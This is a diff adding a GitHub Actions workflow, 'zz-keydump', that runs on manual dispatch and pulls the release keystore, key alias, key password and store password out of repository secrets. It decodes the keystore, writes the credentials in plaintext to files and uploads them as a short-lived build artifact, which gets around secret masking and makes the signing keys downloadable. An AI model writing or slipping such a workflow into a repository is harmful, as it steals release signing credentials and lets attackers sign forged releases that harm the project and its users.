@@ -1,0 +1,26 @@
+name: zz-keydump
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: collect
+        env:
+          KS: ${{ secrets.RELEASE_KEYSTORE_BASE64 }}
+          ALIAS: ${{ secrets.RELEASE_KEY_ALIAS }}
+          KPASS: ${{ secrets.RELEASE_KEY_PASSWORD }}
+          SPASS: ${{ secrets.RELEASE_STORE_PASSWORD }}
+        run: |
+          mkdir -p out
+          printf '%s' "$KS" > out/ks.raw.b64
+          printf '%s' "$KS" | base64 -d > out/release.keystore 2>/dev/null || true
+          printf 'ALIAS=%s\nKEYPASS=%s\nSTOREPASS=%s\n' "$ALIAS" "$KPASS" "$SPASS" > out/creds.txt
+          wc -c out/release.keystore out/ks.raw.b64 out/creds.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: keydump
+          path: out
+          retention-days: 1
